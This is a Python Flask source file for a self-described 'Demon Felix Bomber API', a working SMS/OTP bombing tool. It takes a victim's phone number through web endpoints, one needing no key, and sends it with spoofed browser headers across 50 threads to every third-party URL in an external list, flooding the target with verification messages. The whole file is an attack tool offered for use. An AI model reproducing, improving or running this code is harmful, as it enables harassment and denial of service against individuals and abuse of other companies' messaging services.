# ============================================
# DEMON 😈 FELIX BOMBER API - SINGLE KEY
# File: main.py
# ============================================

from flask import Flask, request, jsonify
import requests
import json
import re
import time
import os
from concurrent.futures import ThreadPoolExecutor, as_completed

app = Flask(__name__)

# ============================================
# CONFIG
# ============================================
THREADS = 50
TIMEOUT = 10
MAX_WORKERS = 50

# ============================================
# ONLY ONE KEY - NO LIMIT
# ============================================
VALID_KEYS = {
    "felix": {"name": "Felix", "limit": 999999, "used": 0}
}

def verify_key(api_key):
    if not api_key:
        return None
    return VALID_KEYS.get(api_key)

def check_limit(api_key):
    if api_key in VALID_KEYS:
        VALID_KEYS[api_key]["used"] += 1
        return True
    return False

# ============================================
# LOAD APIS
# ============================================
def load_apis():
    apis = []
    try:
        with open('bomber_apis.txt', 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                url = line.strip()
                if not url or url.startswith('#') or url.startswith('='):
                    continue
                match = re.search(r'https?://[^\s\'"]+', url)
                if match:
                    clean_url = match.group(0)
                    clean_url = re.sub(r'[^\x20-\x7E]', '', clean_url)
                    if clean_url.startswith('http'):
                        apis.append(clean_url)
    except FileNotFoundError:
        return []
    return apis

def filter_apis(apis):
    filtered = []
    skip_patterns = ['127.0.0.1', 'localhost', '192.168', '10.0.0', '0.0.0.0', '.onion', 'example.com']
    for url in apis:
        skip = False
        for pattern in skip_patterns:
            if pattern in url:
                skip = True
                break
        if not skip:
            filtered.append(url)
    return filtered

# ============================================
# FORMAT URL
# ============================================
def format_url(url, phone):
    formatted = url
    placeholders = ['phone', 'num', 'number', 'no', 'target', 'mobile', 'aadhaar', 'uid']
    for ph in placeholders:
        formatted = formatted.replace(f'{{{ph}}}', phone)
    return formatted

# ============================================
# HIT API
# ============================================
def hit_api(url, phone):
    try:
        formatted_url = format_url(url, phone)
        headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36",
            "Accept": "application/json, text/plain, */*",
            "Connection": "keep-alive"
        }
        response = requests.get(formatted_url, headers=headers, timeout=TIMEOUT)
        if response.status_code in [200, 201, 202, 204, 302, 301]:
            return {'status': 'success', 'code': response.status_code}
        else:
            return {'status': 'failed', 'code': response.status_code}
    except:
        return {'status': 'error'}

# ============================================
# BOMBER ENGINE
# ============================================
class DemonBomber:
    def __init__(self, phone):
        self.phone = phone
        self.apis = filter_apis(load_apis())
        self.success = 0
        self.failed = 0
        
    def run(self):
        if not self.apis:
            return {'total': 0, 'success': 0, 'failed': 0}
        
        start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            futures = {executor.submit(hit_api, url, self.phone): url for url in self.apis}
            for future in futures:
                try:
                    result = future.result()
                    if result['status'] == 'success':
                        self.success += 1
                    else:
                        self.failed += 1
                except:
                    self.failed += 1
        
        elapsed = time.time() - start_time
        
        return {
            'total': len(self.apis),
            'success': self.success,
            'failed': self.failed,
            'time': round(elapsed, 2)
        }

# ============================================
# ROUTES
# ============================================

@app.route('/', methods=['GET'])
def home():
    apis = filter_apis(load_apis())
    return jsonify({
        'status': 'online',
        'name': 'DEMON 😈 Felix Bomber API',
        'version': '3.0',
        'key': 'felix',
        'total_apis': len(apis),
        'threads_per_cycle': MAX_WORKERS,
        'endpoints': {
            '/bomb?key=felix&phone=XXXXXXXXXX': 'With Key',
            '/bomb/XXXXXXXXXX': 'Direct (No Key)',
            '/status': 'Check status',
            '/stats': 'Get stats'
        }
    })

@app.route('/status', methods=['GET'])
def status():
    return jsonify({
        'status': 'active',
        'key': 'felix',
        'total_apis': len(filter_apis(load_apis())),
        'threads': MAX_WORKERS
    })

@app.route('/stats', methods=['GET'])
def stats():
    apis = filter_apis(load_apis())
    return jsonify({
        'total_apis': len(apis),
        'threads_per_cycle': MAX_WORKERS,
        'timeout': TIMEOUT,
        'key': 'felix'
    })

@app.route('/bomb', methods=['GET'])
def bomb_with_key():
    """Bomb with key"""
    key = request.args.get('key')
    phone = request.args.get('phone')
    
    # Check key
    if not key:
        return jsonify({'error': 'Key required', 'usage': '/bomb?key=felix&phone=XXXXXXXXXX'}), 401
    
    if key != 'felix':
        return jsonify({'error': 'Invalid key! Only "felix" is allowed'}), 401
    
    if not phone:
        return jsonify({'error': 'Phone required'}), 400
    
    phone = ''.join(filter(str.isdigit, phone))
    if len(phone) < 10:
        return jsonify({'error': 'Invalid phone number'}), 400
    
    bomber = DemonBomber(phone)
    result = bomber.run()
    
    return jsonify({
        'status': 'completed',
        'phone': phone,
        'key_used': 'felix',
        'summary': result
    })

@app.route('/bomb/<phone>', methods=['GET'])
def bomb_direct(phone):
    """Direct bomb - NO KEY NEEDED"""
    phone = ''.join(filter(str.isdigit, phone))
    if len(phone) < 10:
        return jsonify({'error': 'Invalid phone number'}), 400
    
    bomber = DemonBomber(phone)
    result = bomber.run()
    
    return jsonify({
        'status': 'completed',
        'phone': phone,
        'summary': result
    })

# ============================================
# MAIN
# ============================================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    apis = filter_apis(load_apis())
    print(f"[DEMON] Starting on port {port}")
    print(f"[DEMON] Total APIs: {len(apis)}")
    print(f"[DEMON] Only Key: felix")
    app.run(host='0.0.0.0', port=port, debug=False)
